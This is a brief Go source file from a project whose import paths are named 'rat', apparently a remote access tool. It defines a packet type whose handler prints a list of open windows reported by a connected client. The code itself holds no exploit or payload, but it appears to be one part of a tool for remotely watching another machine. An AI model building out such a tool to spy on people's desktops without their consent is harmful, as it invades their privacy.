package main

import (
	"fmt"
	"rat/shared"
	"rat/shared/network/header"
)

type WindowsPacket struct {
	Windows []shared.Window `network:"receive"`
}

func (packet WindowsPacket) Header() header.PacketHeader {
	return header.WindowsHeader
}

func (packet WindowsPacket) Init(c *Client) {

}

func (packet WindowsPacket) OnReceive(c *Client) error {
	for _, window := range packet.Windows {
		fmt.Println(window)
	}

	return nil
}
